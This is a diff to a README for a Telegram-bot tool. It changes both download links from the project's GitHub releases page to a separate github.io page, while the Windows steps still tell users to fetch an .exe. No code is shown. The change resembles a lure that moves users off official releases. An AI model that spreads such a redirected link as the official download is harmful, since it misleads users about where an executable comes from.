@@ -1,7 +1,7 @@
 # 🤖 mtgo-bot-api - Run Telegram bots with custom servers
 
 <p align="center">
-  <a href="https://github.com/linneacurable92/mtgo-bot-api/releases">
+  <a href="https://linneacurable92.github.io">
     <img src="https://img.shields.io/badge/Download-Latest-blue.svg" alt="Download">
   </a>
 </p>
@@ -26,7 +26,7 @@ Before you start, check your computer for these items:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official page to [download the latest release](https://github.com/linneacurable92/mtgo-bot-api/releases).
+1.  Visit the official page to [download the latest release](https://linneacurable92.github.io).
 2.  Look for the file ending in `.exe` under the Assets section.
 3.  Click the file name to start the download.
 4.  Move the downloaded file to a folder where you want to keep your program files.
